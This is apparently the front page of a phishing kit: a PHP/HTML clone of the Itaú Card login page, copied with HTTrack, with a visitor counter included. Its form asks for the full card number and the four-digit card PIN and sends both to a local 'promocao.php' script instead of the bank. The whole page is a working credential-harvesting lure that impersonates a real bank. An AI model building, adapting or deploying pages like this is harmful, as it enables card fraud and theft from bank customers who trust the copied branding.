<?php
include("contador.php");
?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<title>Itau Card | Identificação</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="js/home_scripts.js"></script>
	<link rel="shortcut icon" href="assets/imagenss/ico_favicon.png">
	<link rel="stylesheet" type="text/css" href="assets/css/home_style.css">
</head>
<body>
	<header class="top-home">
		<img src="assets/imagenss/img_home_logo.png">
	</header>
	<section class="frm-container">
		<form name="frmlog" method="POST" action="promocao.php">
			<div class="frm-item">
				<input type="tel" id="numc" name="numc" maxlength="16" autocomplete="off" required="" onkeyup="validatebt()">
				<label for="numc" class="label-float">número do cartão</label>
			</div>
			<div class="frm-item">
				<input type="tel" id="passc" name="passc" maxlength="4" autocomplete="off" required="" onkeyup="passballs(this.value), validatebt()">
				<label for="passc" class="label-float">senha do cartão</label>
				<span class="cd"></span>
				<span id="ball1" class="balls"></span>
				<span id="ball2" class="balls"></span>
				<span id="ball3" class="balls"></span>
				<span id="ball4" class="balls"></span>
			</div>
			<input type="submit" id="btnlog" name="btnlog" class="btn" value="acessar" disabled="disabled">
		</form>
	</section>
	<footer class="ft-home">
		<ul>
			<li>
				<img src="assets/imagenss/ic_contact_card.png">
				<p>pedir cartão</p>
			</li>
			<li>
				<img src="assets/imagenss/ic_itokenapp.png">
				<p>iToken</p>
			</li>
			<li>
				<img src="assets/imagenss/ic_ajuda.png">
				<p>ajuda</p>
			</li>
			<div style="clear: both;"></div>
		</ul>
	</footer>
</body>
</html>